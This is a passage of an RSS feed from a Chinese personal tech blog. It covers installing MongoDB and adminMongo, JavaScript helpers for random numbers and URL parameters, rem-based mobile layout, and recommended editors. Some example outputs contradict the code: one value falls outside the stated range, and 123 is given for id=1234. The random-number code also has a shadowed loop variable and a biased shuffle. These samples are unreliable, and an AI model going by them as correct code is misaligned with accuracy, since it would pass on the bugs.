<span>logpath</span><span>=</span>D:<span>\</span>MongoDB<span>\</span>logs<span>\</span>mongodb.log <span># 日志输出文件路径</span>
<span>logappend</span><span>=</span>true <span># 错误日志采用追加模式,配置这个选项后 mongodb 的日志会追加到现有的日志文件,而不是从新创建一个新文件</span>
<span>journal</span><span>=</span>true <span># 启用日志文件,默认启用</span>
<span>quiet</span><span>=</span>true <span># 这个选项可以过滤掉一些无用的日志信息,若需要调试使用请设置为 false</span>
<span>port</span><span>=</span><span>27017</span> <span># 端口号 默认为 27017</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这里仅指定了几个常用项, 更多详细配置请参考官方文档 <a href="https://docs.mongodb.org/manual/reference/configuration-options/" target="_blank" rel="noopener noreferrer">https://docs.mongodb.org/manual/reference/configuration-options/</a></p>
<h3 id="普通启动" tabindex="-1"> 普通启动</h3>
<div><pre><code>mongod --config D:<span>\</span>MongoDB<span>\</span>etc<span>\</span>mongodb.conf
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="安装为-windows-服务-1" tabindex="-1"> 安装为 Windows 服务</h3>
<div><pre><code>mongod --config D:<span>\</span>MongoDB<span>\</span>etc<span>\</span>mongodb.conf --install
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="使用-sc-安装为-windows-服务" tabindex="-1"> 使用 SC 安装为 Windows 服务</h3>
<div><pre><code>sc create MongoDB <span>binPath</span><span>=</span> <span>"D:\MongoDB<span title="\b">\b</span>in\mongod.exe --service --config=D:\MongoDB<span title="\e">\e</span>tc\mongodb.conf"</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>启动服务时需要管理员权限</p>
<div><pre><code>net start MongoDB
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="浏览器测试" tabindex="-1"> 浏览器测试</h3>
<p>打开浏览器, 访问 <a href="http://127.0.0.1:27017/" target="_blank" rel="noopener noreferrer">http://127.0.0.1:27017/</a> , 显示以下内容表示安装成功<br></p>
<p><img src="/assets/install-mongodb-5.png" alt="Windows 下安装 MongoDB"></p>
<h2 id="附上-ubuntu-下安装" tabindex="-1"> 附上 Ubuntu 下安装</h2>
<p>Ubuntu 下安装非常简单, 执行一条命令就行, 无需任何配置, 执行完后直接使用。</p>
<div><pre><code><span>sudo</span> <span>apt-get</span> -y <span>install</span> mongodb
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="图形化管理工具" tabindex="-1"> 图形化管理工具</h2>
<div><p>工具推荐</p>
<p>工具推荐推荐图形化管理工具 <a href="http://adminmongo.markmoffat.com/" target="_blank" rel="noopener noreferrer">adminMongo</a></p>
</div>
<h3 id="环境需求" tabindex="-1"> 环境需求</h3>
<ul>
<li>Node.js(使用 nvm 进行安装)</li>
<li>pm2( <code>npm -g pm2</code> )</li>
<li>git</li>
</ul>
<h3 id="下载-1" tabindex="-1"> 下载</h3>
<div><pre><code><span>git</span> clone https://github.com/mrvautin/adminMongo.git
<span>cd</span> adminMongo <span>&amp;&amp;</span> <span>npm</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="pm2-启动" tabindex="-1"> pm2 启动</h3>
<div><pre><code><span>cd</span> adminMongo
pm2 start app.js
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="访问测试" tabindex="-1"> 访问测试</h3>
<p>打开浏览器, 访问 <a href="http://127.0.0.1:1234/" target="_blank" rel="noopener noreferrer">http://127.0.0.1:1234/</a> , 显示以下内容表示安装成功<br></p>
<p><img src="/assets/install-mongodb-6.png" alt="Windows 下安装 MongoDB"></p>
<h3 id="配置使用" tabindex="-1"> 配置使用</h3>
<p>Connection name =&gt; 连接名随意 Connection string =&gt; 连接方法: <code>mongodb://&lt;user&gt;:&lt;password&gt;@127.0.0.1:&lt;port&gt;/&lt;db&gt;</code> Connection options =&gt; 链接选项 <a href="http://mongodb.github.io/node-mongodb-native/2.1/reference/connecting/connection-settings/" target="_blank" rel="noopener noreferrer">docs</a></p>
<p>连接成功后创建一个数据库进行测试<br></p>
<p><img src="/assets/install-mongodb-7.png" alt="Windows 下安装 MongoDB"></p>
<p>随意添加一些数据, 注意数据为 JSON 格式<br></p>
<p><img src="/assets/install-mongodb-8.png" alt="Windows 下安装 MongoDB"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/install-mongodb-1.png" type="image/png"/>
    </item>
    <item>
      <title>JavaScript 生成随机数</title>
      <link>https://vxhly.github.io/views/design/js-generated-random-number.html</link>
      <guid>https://vxhly.github.io/views/design/js-generated-random-number.html</guid>
      <source url="https://vxhly.github.io/rss.xml">JavaScript 生成随机数</source>
      <description>前言
为 JS 中的 Math 对象新增生成不重复随机数方法。

</description>
      <category>design</category>
      <pubDate>Tue, 02 Aug 2016 13:49:41 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>为 JS 中的 Math 对象新增生成不重复随机数方法。</p>
</div>

<h2 id="方法源码一" tabindex="-1"> 方法源码一</h2>
<div><pre><code><span>/**
 * Math 对象的扩展方法,可用于生成随机数
 * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>startNum</span>  起始数,整型
 * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>endNum</span>    终止数,整型
 * <span>@param</span>  <span><span>{</span>number<span>}</span></span> <span>count</span>     生成的个数,整型
 * <span>@param</span>  <span><span>{</span>boolean<span>}</span></span> <span>repeat</span>   是否重复,true or false
 * <span>@return</span> <span><span>{</span>Array<span>}</span></span>            返回数组
 */</span>
Math<span>.</span><span>randNum</span> <span>=</span> <span>function</span> <span>(</span><span>startNum<span>,</span> endNum<span>,</span> count<span>,</span> repeat</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>repeat<span>)</span> <span>{</span>
    <span>var</span> ret <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> count<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>// 生成区间范围内的随机数</span>
      ret<span>[</span>i<span>]</span> <span>=</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>endNum <span>-</span> startNum<span>)</span> <span>+</span> startNum<span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> ret<span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>var</span> tmp <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> <span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>tmp<span>.</span>length <span>&lt;</span> count<span>)</span> <span>{</span>
        <span>// 生成区间范围内的随机数</span>
        <span>var</span> rand <span>=</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> <span>(</span>endNum <span>-</span> startNum<span>)</span> <span>+</span> startNum<span>)</span><span>;</span>
        <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> tmp<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
          <span>if</span> <span>(</span>tmp<span>[</span>i<span>]</span> <span>==</span> rand<span>)</span> <span>{</span>
            <span>// 将生成的随机数进行比对,如果相同则重新生成</span>
            <span>return</span> Math<span>.</span><span>randNum</span><span>(</span>startNum<span>,</span> endNum<span>,</span> count<span>,</span> repeat<span>)</span><span>;</span>
          <span>}</span>
        <span>}</span>
        <span>// 向数组添加数据</span>
        tmp<span>.</span><span>push</span><span>(</span>rand<span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>break</span><span>;</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> tmp<span>;</span>
  <span>}</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="如何调用" tabindex="-1"> 如何调用</h3>
<div><pre><code>Math<span>.</span><span>randNum</span><span>(</span>number<span>,</span> number<span>,</span> number<span>,</span> <span>true</span> <span>|</span> <span>false</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="demo1" tabindex="-1"> demo1</h3>
<p>控制台代码</p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span>Math<span>.</span><span>randNum</span><span>(</span><span>3</span><span>,</span> <span>16</span><span>,</span> <span>5</span><span>,</span> <span>true</span><span>)</span><span>;</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出 =&gt; <code>[4, 15, 15, 15, 17]</code></p>
<h3 id="demo2" tabindex="-1"> demo2</h3>
<p>控制台代码</p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span>Math<span>.</span><span>randNum</span><span>(</span><span>3</span><span>,</span> <span>16</span><span>,</span> <span>5</span><span>,</span> <span>false</span><span>)</span><span>;</span><span>)</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出 =&gt; <code>[15, 14, 6, 11, 4]</code></p>
<h2 id="方法源码二" tabindex="-1"> 方法源码二</h2>
<blockquote>
<p>一种更简单的写法</p>
</blockquote>
<div><pre><code><span>var</span> arr <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>)</span><span>;</span> <span>//新建一个数组</span>

<span>// 向数组赋值 0~100</span>
<span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;=</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  arr<span>.</span><span>push</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span>

<span>// 随机排位</span>
arr<span>.</span><span>sort</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>0.5</span> <span>-</span> Math<span>.</span><span>random</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

arr<span>.</span>length <span>=</span> <span>50</span><span>;</span> <span>// 指定数组长度</span>

document<span>.</span><span>write</span><span>(</span>arr<span>)</span><span>;</span> <span>// 输出数组</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>JavaScript 获取 URL 请求参数</title>
      <link>https://vxhly.github.io/views/design/js-get-url-request.html</link>
      <guid>https://vxhly.github.io/views/design/js-get-url-request.html</guid>
      <source url="https://vxhly.github.io/rss.xml">JavaScript 获取 URL 请求参数</source>
      <description>前言
通过 JavaScript 原生方法, 获取 URL 所带的请求参数备用。

</description>
      <category>design</category>
      <pubDate>Sun, 07 Aug 2016 19:21:58 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>通过 JavaScript 原生方法, 获取 URL 所带的请求参数备用。</p>
</div>

<h2 id="方法一-使用正则表达式匹配" tabindex="-1"> 方法一(使用正则表达式匹配)</h2>
<h3 id="方法源码" tabindex="-1"> 方法源码</h3>
<div><pre><code><span>function</span> <span>GetValue</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>var</span> reg <span>=</span> <span>new</span> <span>RegExp</span><span>(</span><span>"(^|&amp;)"</span> <span>+</span> name <span>+</span> <span>"=([^&amp;]*)(&amp;|$)"</span><span>)</span><span>;</span>
  <span>var</span> r <span>=</span> window<span>.</span>location<span>.</span>search<span>.</span><span>substr</span><span>(</span><span>1</span><span>)</span><span>.</span><span>match</span><span>(</span>reg<span>)</span><span>;</span>
  <span>if</span> <span>(</span>r <span>!=</span> <span>null</span><span>)</span> <span>return</span> <span>unescape</span><span>(</span>r<span>[</span><span>2</span><span>]</span><span>)</span><span>;</span>
  <span>return</span> <span>null</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="如何使用" tabindex="-1"> 如何使用?</h3>
<p>若地址栏 URL 为: <code>abc.html?id=1234&amp;&amp;url=https://www.baidu.com</code> 则</p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span><span>GetValue</span><span>(</span><span>"id"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出 =&gt; <code>123</code></p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span><span>GetValue</span><span>(</span><span>"url"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出 =&gt; <a href="https://www.baidu.com%60" target="_blank" rel="noopener noreferrer">https://www.baidu.com`</a></p>
<h2 id="方法二-普通字符串截取" tabindex="-1"> 方法二（普通字符串截取）</h2>
<h3 id="方法源码-1" tabindex="-1"> 方法源码</h3>
<div><pre><code><span>function</span> <span>GetRequest</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> url <span>=</span> location<span>.</span>search<span>;</span>
  <span>var</span> theRequest <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
  <span>if</span> <span>(</span>url<span>.</span><span>indexOf</span><span>(</span><span>"?"</span><span>)</span> <span>!=</span> <span>-</span><span>1</span><span>)</span> <span>{</span>
    <span>var</span> str <span>=</span> url<span>.</span><span>substr</span><span>(</span><span>1</span><span>)</span><span>;</span>
    strs <span>=</span> str<span>.</span><span>split</span><span>(</span><span>"&amp;"</span><span>)</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> strs<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      theRequest<span>[</span>strs<span>[</span>i<span>]</span><span>.</span><span>split</span><span>(</span><span>"="</span><span>)</span><span>[</span><span>0</span><span>]</span><span>]</span> <span>=</span> strs<span>[</span>i<span>]</span><span>.</span><span>split</span><span>(</span><span>"="</span><span>)</span><span>[</span><span>1</span><span>]</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> theRequest<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="如何使用-1" tabindex="-1"> 如何使用?</h3>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span><span>
  <span>var</span> Request <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
  Request <span>=</span> <span>GetRequest</span><span>(</span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>若地址栏 URL 为: <code>abc.html?id=1234&amp;&amp;url=https://www.baidu.com</code> 则</p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span>Request<span>[</span><span>"id"</span><span>]</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出=&gt; <code>123</code></p>
<div><pre><code>console<span>.</span><span>log</span><span>(</span>Request<span>[</span><span>"url"</span><span>]</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>输出 =&gt; &lt;<code>https://www.baidu.com</code>&gt;</p>
]]></content:encoded>
    </item>
    <item>
      <title>移动端网页自适应方案</title>
      <link>https://vxhly.github.io/views/design/layout-project-for-moblie.html</link>
      <guid>https://vxhly.github.io/views/design/layout-project-for-moblie.html</guid>
      <source url="https://vxhly.github.io/rss.xml">移动端网页自适应方案</source>
      <description>前言
解决移动端网页的自适应, 让开发变得更加简洁。

</description>
      <category>design</category>
      <pubDate>Sat, 13 Aug 2016 19:40:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>解决移动端网页的自适应, 让开发变得更加简洁。</p>
</div>

<h2 id="mate-标签" tabindex="-1"> mate 标签</h2>
<div><p>提示</p>
<p>首先要让页面大小铺满屏幕又不能溢出。只需要在 html 的 head 标签内加入 viewport（如下）, 参数分别表示: 页面宽度＝屏幕宽度, 最大和最小伸缩比都是 1, 不允许用户拉缩。</p>
</div>
<div><pre><code><span><span><span>&lt;</span>meta</span>
  <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
  <span>content</span><span><span>=</span><span>"</span>width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no<span>"</span></span>
<span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><ul>
<li><strong>width</strong>: viewport 的宽度, 可以指定为一个像素值, 如: 640, 或者为特殊的值, 如: device-width （设备的宽度）。</li>
<li><strong>initial-scale</strong>: 初始缩放比例, 即当浏览器第一次加载页面时的缩放比例。值为 1.0 即原始尺寸。</li>
<li><strong>maximum-scale</strong>: 允许浏览者缩放到的最大比例, 一般设为 1.0, 即原始尺寸。</li>
<li><strong>minimum-scale</strong>: 允许浏览者缩放到的最小比例, 一般设为 1.0, 即原始尺寸。</li>
<li><strong>user-scalable</strong>: 浏览者是否可以手动缩放, yes 或 no 。</li>
</ul>
<h2 id="使用百分比自适应" tabindex="-1"> 使用百分比自适应</h2>
<div><p>提示</p>
<p>把长度单位转换为百分比来表示, 这样在不同的宽度下, 元素的长宽也会随之变化。</p>
</div>
<ul>
<li>优点: 宽度之间无缝衔接, 操作起来也相对比较方便。</li>
<li>缺点: 字体大小需要另外一套自适应方法来调整；当屏幕宽度大于 <code>700px</code> 后, 继续按照百分比元素会偏大, 这个时候调整起来会比较麻烦。</li>
</ul>
<h2 id="rem-em-自适应" tabindex="-1"> rem, em 自适应</h2>
<div><p>提示</p>
<p>用媒体查询的方法, 确定在不同屏幕宽度下, 改变 html 或 body 的 font-size。再用 rem , em 替代 px 作为单位实现自适应。</p>
</div>
<ul>
<li>优点: 可以根据不同屏幕宽度来设置, 可以完美解决上面说的屏幕偏大时的比例问题。字体的大小也不存在问题。</li>
<li>缺点: 根据宽度区间来设置, 无法实现无缝变换。</li>
</ul>
<h2 id="引入-javascript-代码" tabindex="-1"> 引入 JavaScript 代码</h2>
<div><p>提示</p>
<p>这些兼容方法各有优缺点, 都不算完美, 怎样才能把优点结合在一起, 同时避免缺点呢? 引入 JavaScript 方法源码, 方法原理: 使页面 html 的 font-size 会根据屏幕的宽度自动调整, 而且屏幕宽度和所设字体大小的商是一定的, 然后按照固定比例缩小后作为 rem 的单位长度实现自适应。</p>
</div>
<h3 id="方法源码一-需引入-jquery" tabindex="-1"> 方法源码一（需引入 jQuery）</h3>
<div><pre><code><span>Zepto</span><span>(</span><span>function</span> <span>(</span><span>$</span><span>)</span> <span>{</span>
  <span>// 获取文档的根节点</span>
  <span>var</span> doc <span>=</span> document<span>.</span>documentElement<span>;</span>

  <span>function</span> <span>setFontSize</span><span>(</span><span>)</span> <span>{</span>
    <span>// 获取当前窗口的宽度</span>
    <span>var</span> winWidth <span>=</span> <span>$</span><span>(</span>window<span>)</span><span>.</span><span>width</span><span>(</span><span>)</span><span>;</span>
    <span>// 640 宽度以上进行限制</span>
    <span>var</span> size <span>=</span> <span>(</span>winWidth <span>/</span> <span>640</span><span>)</span> <span>*</span> <span>100</span><span>;</span>
    doc<span>.</span>style<span>.</span>fontSize <span>=</span> <span>(</span>size <span>&lt;</span> <span>100</span> <span>?</span> size <span>:</span> <span>100</span><span>)</span> <span>+</span> <span>"px"</span><span>;</span>
  <span>}</span>

  <span>// 防止在 html 未加载完毕时执行,保证获取正确的页宽</span>
  <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>// 初始化</span>
    <span>setFontSize</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>200</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="方法源码二-javascript-原生代码" tabindex="-1"> 方法源码二（JavaScript 原生代码）</h3>
<div><pre><code><span>(</span><span>function</span> <span>(</span><span>doc<span>,</span> win</span><span>)</span> <span>{</span>
  <span>// 获取文档的根节点</span>
  <span>var</span> docEl <span>=</span> doc<span>.</span>documentElement<span>;</span>
  <span>// 判断移动端是否发生方向改变</span>
  <span>var</span> resizeEvt <span>=</span>
    <span>"orientationchange"</span> <span>in</span> window <span>?</span> <span>"orientationchange"</span> <span>:</span> <span>"resize"</span><span>;</span>

  <span>var</span> <span>recalc</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>// 获取对象的宽度</span>
    <span>var</span> clientWidth <span>=</span> docEl<span>.</span>clientWidth<span>;</span>

    <span>if</span> <span>(</span><span>!</span>clientWidth<span>)</span> <span>return</span><span>;</span>

    <span>if</span> <span>(</span>clientWidth <span>>=</span> <span>640</span><span>)</span> <span>{</span>
      docEl<span>.</span>style<span>.</span>fontSize <span>=</span> <span>"100px"</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      docEl<span>.</span>style<span>.</span>fontSize <span>=</span> <span>100</span> <span>*</span> <span>(</span>clientWidth <span>/</span> <span>640</span><span>)</span> <span>+</span> <span>"px"</span><span>;</span>
    <span>}</span>
  <span>}</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span>doc<span>.</span>addEventListener<span>)</span> <span>return</span><span>;</span>

  win<span>.</span><span>addEventListener</span><span>(</span>resizeEvt<span>,</span> recalc<span>,</span> <span>false</span><span>)</span><span>;</span>
  doc<span>.</span><span>addEventListener</span><span>(</span><span>"DOMContentLoaded"</span><span>,</span> recalc<span>,</span> <span>false</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>(</span>document<span>,</span> window<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="常见问题" tabindex="-1"> 常见问题</h2>
<div><p>提示</p>
<p>以上两个方法源码是 rem 布局的核心代码。 如果你的页面不需要引入 jQuery, 建议你使用 JavaScript 原生代码。 代码大意: 如果页面的宽度超过了 640px, 那么页面中 html 的 font-size 恒为 100px, 否则, 页面中 html 的 font-size 的大小为: <code>100 \ (当前页面宽度 / 640)</code></p>
</div>
<h3 id="为什么是-640px" tabindex="-1"> 为什么是 640px?</h3>
<p>对于手机屏幕来说, <code>640px</code> 的页面宽度是一个安全的最大宽度, 保证了移动端页面两边不会留白。注意这里的 <code>px</code> 是 <code>css</code> 逻辑像素, 与设备的物理像素是有区别的。 如果要切移动端页面, 你可以先把效果图宽度等比例缩放到 <code>640px</code> , 很好用。</p>
<h3 id="为什么要设置-html-的-font-size" tabindex="-1"> 为什么要设置 html 的 font-size?</h3>
<p><code>rem</code> 就是根元素（即: <code>html</code> ）的字体大小。 <code>html</code> 中的所有标签样式凡是涉及到尺寸的（如: <code>height</code> , <code>width</code> , <code>padding</code> , <code>margin</code> , <code>font-size</code> 。甚至 <code>left</code> , <code>top</code> 等）你都可以放心大胆的用 <code>rem</code> 作单位。 如果你把 <code>html</code> 的 <code>font-size</code> 设为 <code>20px</code> , 前面说过, <code>rem</code> 就是 <code>html</code> 的字体大小, 那么 <code>1rem = 20px</code> 。</p>
<h3 id="模拟为什么要使用-iphone-4" tabindex="-1"> 模拟为什么要使用 iphone 4?</h3>
<p>假设你部门的设计师给你的页面标准宽度为 <code>640px</code> , 则页面中所有的 <code>宽高</code> 全部除以 2 , Chrome 浏览器 模拟手机页面 设置手机型号为 <code>IPhone 4</code> 。 这也就是为什么要将所有的宽高除以 2 的原因: <code>IPhone 4</code> 标准 宽 是 <code>320 px</code> 。 然后正常的用 <code>px</code> 为单位 写你的 <code>css</code> , 你所需要做的就是你写的页面, 要在 <code>IPhone 4</code> 完全正确显示。 如果你说, 那设计那边给的不是 <code>640px</code> 标准怎么办? 你只要让你的页面按照设计图在 <code>iphone 4</code> 上正确显示, 就木问题。</p>
<h3 id="rem-单位是如何换算的" tabindex="-1"> rem 单位是如何换算的?</h3>
<p>页面 <code>css</code> 全部写完之后, 将所有的 <code>px</code> 转换为以 <code>rem</code> 为单位的数字。 例如 我设置 <code>body</code> 的 <code>width: 320px；</code> 则根据设置的 <code>font - size</code> 值, 转换为 <code>rem</code> , 则是 <code>width: 16 rem；</code> 【320 / 20 (你设置的标准 <code>font - size</code> ) = 16】。</p>
<h3 id="如何使用插件换算" tabindex="-1"> 如何使用插件换算?</h3>
<p>如果你说一个页面的 <code>css</code> 有几百行, 写完再去改太麻烦了, 那可以用 <code>px</code> 转换成 <code>rem</code> 的插件。 我这里有一款推荐: <code>cssrem</code> （下载使用网址 <a href="http://github.com/flashlizi/cssrem" target="_blank" rel="noopener noreferrer">cssrem</a>）。 该插件是 <code>sublime text</code> 的一款插件。<br></p>
<p><img src="/assets/layout-moblie.gif" alt="cssrem"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/layout-moblie.gif" type="image/gif"/>
    </item>
    <item>
      <title>需要一款称手的编辑器</title>
      <link>https://vxhly.github.io/views/design/need-a-super-software.html</link>
      <guid>https://vxhly.github.io/views/design/need-a-super-software.html</guid>
      <source url="https://vxhly.github.io/rss.xml">需要一款称手的编辑器</source>
      <description>前言
以下介绍的编辑器是跨平台, 无论是 Windows, 还是 Liunx, 甚至是 Mac, 都可以成为程序员称手的利器。

</description>
      <category>design</category>
      <pubDate>Sun, 07 Aug 2016 16:49:47 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>以下介绍的编辑器是跨平台, 无论是 Windows, 还是 Liunx, 甚至是 Mac, 都可以成为程序员称手的利器。</p>
</div>

<h2 id="atom" tabindex="-1"> Atom</h2>
<p>开源。功能强大, 是 Github 团队推出的简洁编辑器, 自带 <code>Node.js</code> 环境。</p>
<h3 id="下载地址" tabindex="-1"> 下载地址</h3>
<p>官网下载地址: <a href="http://github.com/atom/atom/releases" target="_blank" rel="noopener noreferrer">Atom</a><br> 官网下载地址下不下来点击以下链接下载: <a href="http://oss-blog.test.upcdn.net/atom-amd64.deb?attname=" target="_blank" rel="noopener noreferrer">atom-amd64.deb</a> <a href="http://oss-blog.test.upcdn.net/AtomSetup.exe?attname=" target="_blank" rel="noopener noreferrer">AtomSetup.exe</a></p>
<h3 id="安装插件" tabindex="-1"> 安装插件</h3>
<p>使用 <code>Ctrl+,</code> 调出设置页面, 在 <code>install</code> 中查询插件并安装。自带 <code>Node.js</code> 环境。部分插件支持自定义设置。</p>
<h3 id="插件推荐" tabindex="-1"> 插件推荐</h3>
<ul>
<li><strong>emmet</strong> =&gt; 前端开发者必备</li>
<li><strong>atom-beautify</strong> =&gt; 格式化编程语言文件, 支持的语法较广, 如 <code>PHP</code> 、 <code>Python</code> 、 <code>Ruby</code> 、 <code>Java</code> 、 <code>C</code> 等</li>
<li><strong>atom-html-perview</strong> =&gt; <code>html</code> 文件实时预览</li>
<li><strong>atom-minify</strong> =&gt; 压缩 <code>Html</code> 、 <code>CSS</code> 文件</li>
<li><strong>autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>
<li><strong>csscomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>
<li><strong>docblockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li>
<li><strong>atom-ternjs</strong> =&gt; <code>javascript</code> 代码提示</li>
<li><strong>autocomplete-paths</strong> =&gt; 引入文件时, 自动补全路径</li>
<li><strong>language-markdown</strong> =&gt; <code>markdown</code> 文件语法高亮</li>
<li><strong>language-vue</strong> =&gt; <code>vue</code> 文件语法高亮</li>
<li><strong>logo-file-icons</strong> =&gt; 文件图标</li>
<li><strong>markdown-scroll-sync</strong> =&gt; <code>markdown</code> 文件预览自动滚动</li>
<li><strong>simplified-chinese-menu</strong> =&gt; <code>Atom</code> 简体中文语言包</li>
<li><strong>vue-autocomplete</strong> =&gt; <code>vue</code> 文件代码自动提示</li>
<li><strong>vue-format</strong> =&gt; <code>vue</code> 文件自动格式化</li>
<li><strong>sync-settings</strong> =&gt; atom 插件备份(需要 Githunb Access Token 和 Gist Id)</li>
</ul>
<h2 id="brackets" tabindex="-1"> Brackets</h2>
<p>开源。功能强大, 是一个非常优秀的 <code>WEB</code> 设计和前端开发的源代码编辑器。当然也支持 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等编程语言。支持实时预览。自带 <code>Node.js</code> 环境。</p>
<h3 id="下载地址-1" tabindex="-1"> 下载地址</h3>
<p><a href="http://github.com/adobe/brackets/releases" target="_blank" rel="noopener noreferrer">Brackets</a><br> 官网下载地址下不下来点击以下链接下载: <a href="http://oss-blog.test.upcdn.net/Brackets.Release.1.8.msi?attname=" target="_blank" rel="noopener noreferrer">Brackets. Release.1.8.msi</a><br> <a href="http://oss-blog.test.upcdn.net/Brackets.Release.1.8.64-bit.deb?attname=" target="_blank" rel="noopener noreferrer">Brackets. Release.1.8.64-bit.deb</a></p>
<h3 id="安装插件-1" tabindex="-1"> 安装插件</h3>
<p>部分插件是使用国外源的, 很容易被墙的。所以系统最好要有个代理服务器, 这里推荐 <a href="http://www.gaotizi.com/aff.php?aff=133" target="_blank" rel="noopener noreferrer">高梯子</a>。</p>
<h3 id="如何安装" tabindex="-1"> 如何安装</h3>
